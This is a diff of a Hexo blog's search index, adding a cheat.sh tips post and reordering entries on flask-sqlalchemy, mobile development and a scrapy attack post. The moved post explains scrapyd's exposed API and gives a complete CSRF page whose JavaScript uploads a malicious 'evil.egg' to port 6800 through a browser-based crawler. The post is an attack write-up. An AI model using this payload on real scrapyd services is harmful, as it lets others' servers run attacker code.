@@ -1,6 +1,25 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>cheat.sh使用技巧</title>
+    <url>/2020/12/06/cheat/</url>
+    <content><![CDATA[<p>提成效率的必备工具<br><a id="more"></a></p>
+<p>cheat.sh可以通过访问api接口就能实现查询Linux命令、代码和sql等，真的是程序员的好帮手</p>
+<h1 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h1><p>基本的使用方法<br><code>curl cht.sh</code></p>
+<h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><p><img src="http://cos.24uw.cn/cd4557a07db1e6a5a338be14eb43bb3e.png" alt="cd4557a07db1e6a5a338be14eb43bb3e.png"></p>
+<h1 id="使用技巧"><a href="#使用技巧" class="headerlink" title="使用技巧"></a>使用技巧</h1><p>查找命令 <code>curl cht.sh/tr</code><br>模糊搜索 <code>curl cht.sh/~python</code><br>链接查找 <code>curl cht.sh/java/lambda+group</code></p>
+<h1 id="下载脚本"><a href="#下载脚本" class="headerlink" title="下载脚本"></a>下载脚本</h1><p>不用curl，在本地就能通过sh脚本运行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 注意你的环境变量 PATH 已经 import 了 ~/bin 下的内容</span><br><span class="line">mkdir -p ~/bin/</span><br><span class="line">curl https://cht.sh/:cht.sh &gt; ~/bin/cht.sh</span><br><span class="line">chmod +x ~/bin/cht.sh</span><br><span class="line"></span><br><span class="line"># 注意你的环境变量 PATH 已经 import 了 ~/bin 下的内容</span><br><span class="line">mkdir -p ~/bin/</span><br><span class="line">curl https://cht.sh/:cht.sh &gt; ~/bin/cht.sh</span><br><span class="line">chmod +x ~/bin/cht.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">召唤更牛的方式</span><br><span class="line">cht.sh --shell java</span><br></pre></td></tr></table></figure>
+<p><img src="http://cos.24uw.cn/bba433c1031d8b456f81a7d1e98b7798.png" alt="bba433c1031d8b456f81a7d1e98b7798.png"></p>
+]]></content>
+      <categories>
+        <category>编程技巧</category>
+      </categories>
+      <tags>
+        <tag>编程技巧</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>微信小程序加密不支持btoa的解决方法，window.btoa报错解决办法</title>
     <url>/2020/08/24/weixin-8/</url>
     <content><![CDATA[<p>window.btoa报错解决办法<br><a id="more"></a></p>
@@ -1648,27 +1667,6 @@ Ctrl + Shift +</code> 新建终端<br>Command + Up 向上滚动<br>Command + Dow
       </tags>
   </entry>
   <entry>
-    <title>scrapy框架攻击</title>
-    <url>/2020/02/13/scrapy-attack/</url>
-    <content><![CDATA[<p>如何攻击scrapy<br><a id="more"></a></p>
-<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>scrapy是一个爬虫框架，而scrapyd是一个云服务，用户可以将自己用scrapy框架开发的爬虫上传到云端，然后通过Web API调用这个爬虫爬取信息。</p>
-<p>scrapyd主要提供以下一些API：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/daemonstatus.json 获取云服务的状态</span><br><span class="line">/addversion.json 上传一个新的爬虫项目，或者给一个已有的项目更新代码</span><br><span class="line">/schedule.json 执行一个爬取任务</span><br><span class="line">/cancel.json 停止并取消一个任务</span><br><span class="line">/listprojects.json 列出云端的所有项目</span><br><span class="line">/listversions.json 列出某个项目的所有代码版本</span><br><span class="line">/listspiders.json 列出一个项目下所有spider，spider这个概念是scrapy框架中的，一个scrapy开发的爬虫可以有多个spider</span><br><span class="line">/listjobs.json 列出所有任务，包括正在进行的、已完成的、等待执行的三个状态</span><br><span class="line">/delversion.json 删除某个项目下的某个代码版本</span><br><span class="line">/delversion.json 删除某个项目</span><br></pre></td></tr></table></figure></p>
-<p>简单来说，scrapyd云服务下可以有多个项目，每个项目下可以有多个代码版本，每个代码版本就是一个完整的scrapy项目，一个scrapy项目下可以有多个spider，最终执行的任务的载体是一个spider。<br>攻击者可以创建一个项目，并部署他自己的scrapy代码版本，将恶意代码部署到云端，进而对scrapyd云端进行攻击。</p>
-<h1 id="利用CSRF漏洞攻击浏览器爬虫"><a href="#利用CSRF漏洞攻击浏览器爬虫" class="headerlink" title="利用CSRF漏洞攻击浏览器爬虫"></a>利用CSRF漏洞攻击浏览器爬虫</h1><p>针对6800端口的攻击在本地可以复现了，但是目标网站的6800是开启在内网的，我们无法直接访问。</p>
-<p>这个URL是被浏览器执行的，而scrapyd的所有API接口实际上都是可以进行CSRF攻击的，所以我们可以利用页面中的JavaScript发送POST数据包给6800端口，进而调用那些非GET型的API。</p>
-<p>构造一个向<a href="http://127.0.0.1:6800/addversion.json发送POST上传请求的页面：" target="_blank" rel="noopener">http://127.0.0.1:6800/addversion.json发送POST上传请求的页面：</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;title&gt;upload csrf&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;script type=&quot;text/javascript&quot; charset=&quot;utf-8&quot;&gt;</span><br><span class="line">  function b64toBlob(b64Data, contentType, sliceSize) &#123;</span><br><span class="line">        contentType = contentType || &apos;&apos;;</span><br><span class="line">        sliceSize = sliceSize || 512;</span><br><span class="line"></span><br><span class="line">        var byteCharacters = atob(b64Data);</span><br><span class="line">        var byteArrays = [];</span><br><span class="line"></span><br><span class="line">        for (var offset = 0; offset &lt; byteCharacters.length; offset += sliceSize) &#123;</span><br><span class="line">            var slice = byteCharacters.slice(offset, offset + sliceSize);</span><br><span class="line"></span><br><span class="line">            var byteNumbers = new Array(slice.length);</span><br><span class="line">            for (var i = 0; i &lt; slice.length; i++) &#123;</span><br><span class="line">                byteNumbers[i] = slice.charCodeAt(i);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            var byteArray = new Uint8Array(byteNumbers);</span><br><span class="line"></span><br><span class="line">            byteArrays.push(byteArray);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      var blob = new Blob(byteArrays, &#123;type: contentType&#125;);</span><br><span class="line">      return blob;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    var blob = b64toBlob(&quot;base64 data of evil.egg...&quot;, &apos;application/octet-stream&apos;)</span><br><span class="line"></span><br><span class="line">    var myFormData = new FormData();</span><br><span class="line">    myFormData.append(&quot;egg&quot;, blob, &quot;evil.egg&quot;);</span><br><span class="line">    myFormData.append(&quot;project&quot;, &quot;evil_project_01&quot;)</span><br><span class="line">    myFormData.append(&quot;version&quot;, &quot;r01&quot;)</span><br><span class="line">    fetch(&quot;http://127.0.0.1:6800/addversion.json&quot;, &#123;</span><br><span class="line">        method: &quot;post&quot;,</span><br><span class="line">        body: myFormData</span><br><span class="line">    &#125;)</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-<p>值得注意的是，因为我们要上传一个二进制文件，所以我将evil.egg进行的base64编码：cat evil.egg | base64，然后将其转换成JavaScript中的Blob对象，添加到FormData中。</p>
-<p>将这个页面提交给爬虫进行爬取，成功完成整个利用过程。</p>
-<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/02/22/sentou-1/">渗透的方法和思路</a></li></ul></div>]]></content>
-      <categories>
-        <category>scrapy</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>scrapy framework attack</title>
     <url>/2020/02/13/scrapy-attack-en/</url>
     <content><![CDATA[<p>How to attack scrapy<br><a id="more"></a></p>
@@ -1687,6 +1685,27 @@ Ctrl + Shift +</code> 新建终端<br>Command + Up 向上滚动<br>Command + Dow
       </categories>
       <tags>
         <tag>infiltration</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>scrapy框架攻击</title>
+    <url>/2020/02/13/scrapy-attack/</url>
+    <content><![CDATA[<p>如何攻击scrapy<br><a id="more"></a></p>
+<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>scrapy是一个爬虫框架，而scrapyd是一个云服务，用户可以将自己用scrapy框架开发的爬虫上传到云端，然后通过Web API调用这个爬虫爬取信息。</p>
+<p>scrapyd主要提供以下一些API：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/daemonstatus.json 获取云服务的状态</span><br><span class="line">/addversion.json 上传一个新的爬虫项目，或者给一个已有的项目更新代码</span><br><span class="line">/schedule.json 执行一个爬取任务</span><br><span class="line">/cancel.json 停止并取消一个任务</span><br><span class="line">/listprojects.json 列出云端的所有项目</span><br><span class="line">/listversions.json 列出某个项目的所有代码版本</span><br><span class="line">/listspiders.json 列出一个项目下所有spider，spider这个概念是scrapy框架中的，一个scrapy开发的爬虫可以有多个spider</span><br><span class="line">/listjobs.json 列出所有任务，包括正在进行的、已完成的、等待执行的三个状态</span><br><span class="line">/delversion.json 删除某个项目下的某个代码版本</span><br><span class="line">/delversion.json 删除某个项目</span><br></pre></td></tr></table></figure></p>
+<p>简单来说，scrapyd云服务下可以有多个项目，每个项目下可以有多个代码版本，每个代码版本就是一个完整的scrapy项目，一个scrapy项目下可以有多个spider，最终执行的任务的载体是一个spider。<br>攻击者可以创建一个项目，并部署他自己的scrapy代码版本，将恶意代码部署到云端，进而对scrapyd云端进行攻击。</p>
+<h1 id="利用CSRF漏洞攻击浏览器爬虫"><a href="#利用CSRF漏洞攻击浏览器爬虫" class="headerlink" title="利用CSRF漏洞攻击浏览器爬虫"></a>利用CSRF漏洞攻击浏览器爬虫</h1><p>针对6800端口的攻击在本地可以复现了，但是目标网站的6800是开启在内网的，我们无法直接访问。</p>
+<p>这个URL是被浏览器执行的，而scrapyd的所有API接口实际上都是可以进行CSRF攻击的，所以我们可以利用页面中的JavaScript发送POST数据包给6800端口，进而调用那些非GET型的API。</p>
+<p>构造一个向<a href="http://127.0.0.1:6800/addversion.json发送POST上传请求的页面：" target="_blank" rel="noopener">http://127.0.0.1:6800/addversion.json发送POST上传请求的页面：</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;title&gt;upload csrf&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;script type=&quot;text/javascript&quot; charset=&quot;utf-8&quot;&gt;</span><br><span class="line">  function b64toBlob(b64Data, contentType, sliceSize) &#123;</span><br><span class="line">        contentType = contentType || &apos;&apos;;</span><br><span class="line">        sliceSize = sliceSize || 512;</span><br><span class="line"></span><br><span class="line">        var byteCharacters = atob(b64Data);</span><br><span class="line">        var byteArrays = [];</span><br><span class="line"></span><br><span class="line">        for (var offset = 0; offset &lt; byteCharacters.length; offset += sliceSize) &#123;</span><br><span class="line">            var slice = byteCharacters.slice(offset, offset + sliceSize);</span><br><span class="line"></span><br><span class="line">            var byteNumbers = new Array(slice.length);</span><br><span class="line">            for (var i = 0; i &lt; slice.length; i++) &#123;</span><br><span class="line">                byteNumbers[i] = slice.charCodeAt(i);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            var byteArray = new Uint8Array(byteNumbers);</span><br><span class="line"></span><br><span class="line">            byteArrays.push(byteArray);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      var blob = new Blob(byteArrays, &#123;type: contentType&#125;);</span><br><span class="line">      return blob;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    var blob = b64toBlob(&quot;base64 data of evil.egg...&quot;, &apos;application/octet-stream&apos;)</span><br><span class="line"></span><br><span class="line">    var myFormData = new FormData();</span><br><span class="line">    myFormData.append(&quot;egg&quot;, blob, &quot;evil.egg&quot;);</span><br><span class="line">    myFormData.append(&quot;project&quot;, &quot;evil_project_01&quot;)</span><br><span class="line">    myFormData.append(&quot;version&quot;, &quot;r01&quot;)</span><br><span class="line">    fetch(&quot;http://127.0.0.1:6800/addversion.json&quot;, &#123;</span><br><span class="line">        method: &quot;post&quot;,</span><br><span class="line">        body: myFormData</span><br><span class="line">    &#125;)</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>值得注意的是，因为我们要上传一个二进制文件，所以我将evil.egg进行的base64编码：cat evil.egg | base64，然后将其转换成JavaScript中的Blob对象，添加到FormData中。</p>
+<p>将这个页面提交给爬虫进行爬取，成功完成整个利用过程。</p>
+<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/02/22/sentou-1/">渗透的方法和思路</a></li></ul></div>]]></content>
+      <categories>
+        <category>scrapy</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
       </tags>
   </entry>
   <entry>
@@ -2078,23 +2097,6 @@ Ctrl + Shift +</code> 新建终端<br>Command + Up 向上滚动<br>Command + Dow
       </tags>
   </entry>
   <entry>
-    <title>2020年最新flask-sqlalchemy用法总结(2)</title>
-    <url>/2020/02/11/flask-sqlalchemy2/</url>
-    <content><![CDATA[<p>最全的flask-sqlalchemy用法总结<br><a id="more"></a></p>
-<h1 id="SQLAlchemy常用数据类型"><a href="#SQLAlchemy常用数据类型" class="headerlink" title="SQLAlchemy常用数据类型"></a>SQLAlchemy常用数据类型</h1><p>Integer：整形，映射到数据库中是int类型。<br>Float：浮点类型，映射到数据库中是float类型。他占据的32位。<br>Double：双精度浮点类型，映射到数据库中是double类型，占据64位。<br>String：可变字符类型，映射到数据库中是varchar类型.<br>Boolean：布尔类型，映射到数据库中的是tinyint类型。<br>DECIMAL：定点类型。是专门为了解决浮点类型精度丢失的问题的。<br>Enum：枚举类型。指定某个字段只能是枚举中指定的几个值，不能为其他值。在ORM模型中，使用<br>Date：存储时间，只能存储年月日。映射到数据库中是date类型<br>DateTime：存储时间，可以存储年月日时分秒毫秒等<br>Time：存储时间，可以存储时分秒。映射到数据库中也是time类型<br>Text：存储长字符串。一般可以存储6W多个字符<br>LONGTEXT：长文本类型，映射到数据库中是longtext类型</p>
-<ul>
-<li>Enum：枚举类型用法<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">class TagEnum(enum.Enum):</span><br><span class="line">    python = &quot;python&quot;</span><br><span class="line">    flask = &quot;flask&quot;</span><br><span class="line">    django = &quot;django&quot;</span><br><span class="line"></span><br><span class="line">class Article(Base):</span><br><span class="line">    __tablename__ = &apos;article&apos;</span><br><span class="line">    id = Column(Integer,primary_key=True,autoincrement=True)</span><br><span class="line">    tag = Column(Enum(TagEnum))</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/04/25/flask-sqlalchemy-3/">sqlalchemy时间过滤How to filter date field?</a></li><li><a href="https://thelighter.github.io/2020/02/11/flask-sqlalchemy/">2020年最新flask-sqlalchemy用法总结(1)</a></li><li><a href="https://thelighter.github.io/2020/02/07/flask-time/">如何在Flask_sqlalchemy中查询时间段或者时间点？</a></li></ul></div>]]></content>
-      <categories>
-        <category>flask-sqlalchemy</category>
-      </categories>
-      <tags>
-        <tag>flask-sqlalchemy</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2020年最新flask-sqlalchemy用法总结(1)</title>
     <url>/2020/02/11/flask-sqlalchemy/</url>
     <content><![CDATA[<p>flask-sqlalchemy一看就会<br><a id="more"></a></p>
@@ -2154,19 +2156,20 @@ mysql&gt; set session transaction isolation level read committed;
       </tags>
   </entry>
   <entry>
-    <title>Is there any future for mobile development?</title>
-    <url>/2020/02/11/android-2/</url>
-    <content><![CDATA[<p>Should I do mobile development or back-end development?<br>&lt;!-more-&gt;</p>
-<h1 id="Trend"><a href="#Trend" class="headerlink" title="Trend"></a>Trend</h1><p>With the development of the times, the mobile terminal has replaced the PC terminal and has become the most commonly used Internet portal for daily use. Now the mobile terminal is mainly divided into two camps, Android and iOS, corresponding to Google and Apple. Market development direction. They even developed new programming languages ​​for Android and Ios, such as kotlin and swift, etc. They all hope that developers can rely more on their own platform, so that users can rely more on mobile.</p>
-<p>But after you study these several languages ​​designed for mobile development, you will find that there is very little demand for mobile development in small companies, except for large companies, because it will increase the cost of the enterprise. And responsive web pages can make mobile users happy to use. Faced with this market form, Facebook and Google have designed better mobile programming languages ​​for developers—react native and flutter. These two languages ​​can be written at one time and can be applied to both Android and iOS, saving a lot of time For developers and businesses. flutter can even be applied to H5 and the web.</p>
-<p>alert! From the above we can see that mobile terminal development is dominated by giants, which is not in line with the spirit of open source. In particular, development platforms such as iOS are a nightmare for developers, so after you learn the native development language, you can only serve For large enterprises, it is difficult to turn to other development directions. The future of mobile is hard to say, and it is possible that these native programming languages ​​will be eliminated.</p>
-<h1 id="Engage-in-back-end-development"><a href="#Engage-in-back-end-development" class="headerlink" title="Engage in back-end development"></a>Engage in back-end development</h1><p>Every enterprise needs back-end development talents, and a large number of businesses need back-end development languages ​​to process, such as Java and Python, so the scope of employment is very broad</p>
-<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/02/11/android-1/">移动端开发到底有没有前途</a></li><li><a href="https://thelighter.github.io/2020/02/04/apple-app-7/">一键生成所有尺寸的应用图标和启动图</a></li></ul></div>]]></content>
+    <title>2020年最新flask-sqlalchemy用法总结(2)</title>
+    <url>/2020/02/11/flask-sqlalchemy2/</url>
+    <content><![CDATA[<p>最全的flask-sqlalchemy用法总结<br><a id="more"></a></p>
+<h1 id="SQLAlchemy常用数据类型"><a href="#SQLAlchemy常用数据类型" class="headerlink" title="SQLAlchemy常用数据类型"></a>SQLAlchemy常用数据类型</h1><p>Integer：整形，映射到数据库中是int类型。<br>Float：浮点类型，映射到数据库中是float类型。他占据的32位。<br>Double：双精度浮点类型，映射到数据库中是double类型，占据64位。<br>String：可变字符类型，映射到数据库中是varchar类型.<br>Boolean：布尔类型，映射到数据库中的是tinyint类型。<br>DECIMAL：定点类型。是专门为了解决浮点类型精度丢失的问题的。<br>Enum：枚举类型。指定某个字段只能是枚举中指定的几个值，不能为其他值。在ORM模型中，使用<br>Date：存储时间，只能存储年月日。映射到数据库中是date类型<br>DateTime：存储时间，可以存储年月日时分秒毫秒等<br>Time：存储时间，可以存储时分秒。映射到数据库中也是time类型<br>Text：存储长字符串。一般可以存储6W多个字符<br>LONGTEXT：长文本类型，映射到数据库中是longtext类型</p>
+<ul>
+<li>Enum：枚举类型用法<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">class TagEnum(enum.Enum):</span><br><span class="line">    python = &quot;python&quot;</span><br><span class="line">    flask = &quot;flask&quot;</span><br><span class="line">    django = &quot;django&quot;</span><br><span class="line"></span><br><span class="line">class Article(Base):</span><br><span class="line">    __tablename__ = &apos;article&apos;</span><br><span class="line">    id = Column(Integer,primary_key=True,autoincrement=True)</span><br><span class="line">    tag = Column(Enum(TagEnum))</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/04/25/flask-sqlalchemy-3/">sqlalchemy时间过滤How to filter date field?</a></li><li><a href="https://thelighter.github.io/2020/02/11/flask-sqlalchemy/">2020年最新flask-sqlalchemy用法总结(1)</a></li><li><a href="https://thelighter.github.io/2020/02/07/flask-time/">如何在Flask_sqlalchemy中查询时间段或者时间点？</a></li></ul></div>]]></content>
       <categories>
-        <category>Mobile Development</category>
+        <category>flask-sqlalchemy</category>
       </categories>
       <tags>
-        <tag>Android</tag>
+        <tag>flask-sqlalchemy</tag>
       </tags>
   </entry>
   <entry>
@@ -2180,6 +2183,22 @@ mysql&gt; set session transaction isolation level read committed;
 <div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/02/11/android-2/">Is there any future for mobile development?</a></li><li><a href="https://thelighter.github.io/2020/02/04/apple-app-7/">一键生成所有尺寸的应用图标和启动图</a></li></ul></div>]]></content>
       <categories>
         <category>移动开发</category>
+      </categories>
+      <tags>
+        <tag>Android</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Is there any future for mobile development?</title>
+    <url>/2020/02/11/android-2/</url>
+    <content><![CDATA[<p>Should I do mobile development or back-end development?<br>&lt;!-more-&gt;</p>
+<h1 id="Trend"><a href="#Trend" class="headerlink" title="Trend"></a>Trend</h1><p>With the development of the times, the mobile terminal has replaced the PC terminal and has become the most commonly used Internet portal for daily use. Now the mobile terminal is mainly divided into two camps, Android and iOS, corresponding to Google and Apple. Market development direction. They even developed new programming languages ​​for Android and Ios, such as kotlin and swift, etc. They all hope that developers can rely more on their own platform, so that users can rely more on mobile.</p>
+<p>But after you study these several languages ​​designed for mobile development, you will find that there is very little demand for mobile development in small companies, except for large companies, because it will increase the cost of the enterprise. And responsive web pages can make mobile users happy to use. Faced with this market form, Facebook and Google have designed better mobile programming languages ​​for developers—react native and flutter. These two languages ​​can be written at one time and can be applied to both Android and iOS, saving a lot of time For developers and businesses. flutter can even be applied to H5 and the web.</p>
+<p>alert! From the above we can see that mobile terminal development is dominated by giants, which is not in line with the spirit of open source. In particular, development platforms such as iOS are a nightmare for developers, so after you learn the native development language, you can only serve For large enterprises, it is difficult to turn to other development directions. The future of mobile is hard to say, and it is possible that these native programming languages ​​will be eliminated.</p>
+<h1 id="Engage-in-back-end-development"><a href="#Engage-in-back-end-development" class="headerlink" title="Engage in back-end development"></a>Engage in back-end development</h1><p>Every enterprise needs back-end development talents, and a large number of businesses need back-end development languages ​​to process, such as Java and Python, so the scope of employment is very broad</p>
+<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/02/11/android-1/">移动端开发到底有没有前途</a></li><li><a href="https://thelighter.github.io/2020/02/04/apple-app-7/">一键生成所有尺寸的应用图标和启动图</a></li></ul></div>]]></content>
+      <categories>
+        <category>Mobile Development</category>
       </categories>
       <tags>
         <tag>Android</tag>
